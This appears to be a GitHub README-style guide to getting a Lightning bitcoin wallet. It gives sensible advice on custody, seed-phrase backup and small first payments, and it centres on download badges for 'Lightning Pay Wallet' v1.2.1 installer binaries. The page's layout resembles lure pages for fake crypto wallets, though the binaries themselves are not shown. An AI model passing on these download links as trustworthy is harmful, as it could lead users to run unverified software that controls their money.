<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# How to get a Lightning wallet and open your first one

Pick the custody model first, then install from the release page, then fund it once.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

Getting a Lightning wallet takes minutes. The decisions worth thinking about happen before the
download, not after it.

## Decide who holds the keys

A custodial wallet is an account: email, password, balance on someone's server, easy recovery. A
non-custodial wallet is software: keys on your machine, no account, and a phrase you must keep.

Neither is universally better. If you will not back up, custody is safer in practice; if you want no
one able to freeze you, self-custody is the only option. The trade is set out in
<a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/custodial-vs-non-custodial-wallet.md">custodial vs non-custodial</a>.

## Install from the source, not from an ad

Download from the project's release page rather than a search result. For this wallet, that means the
release attached to the app repository, and the file names there are the ones you should see. A
"download" button on a page that is not the repository is the single most common way people install
something else.

## Write the phrase down before funding

Create the wallet, then write the recovery phrase on paper before any money arrives. Do not photograph
it, do not paste it into a note, and do not skip the step because the wallet seems to be working.

Then test it: restore once on the same machine before the balance matters. A phrase that has never been
used is a hope.

## Fund it

Send a small amount first. Over Lightning, that requires the wallet to have inbound capacity, which a
new wallet does not have; the first receive may open a channel and cost an on-chain fee. Over on-chain,
send to an address the wallet gives you and wait for a confirmation.

Starting small is not timidity. It is how you learn the timing, the fee behaviour and the interface
before an amount you would miss is involved.

## What to check on the first payment

That the balance moves when the payment settles. That the history records it. That the phrase you wrote
matches the one the wallet shows when you deliberately check it, offline.

## Questions people ask

### Do I need to buy bitcoin first?

Yes, from somewhere that sells it. A wallet receives; it does not sell.

### Is a free wallet safe?

Free is the norm and says nothing about safety. Custody, backup and download source do.

### Can I use the same wallet on two computers?

By restoring from the phrase, yes, but avoid running both at once: the wallet state is not designed to
be shared.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/what-is-a-lightning-wallet.md">What a Lightning wallet is, in plain terms</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/download-lightning-pay-windows-macos.md">Downloading Lightning Pay on Windows and macOS without getting a fake</a>

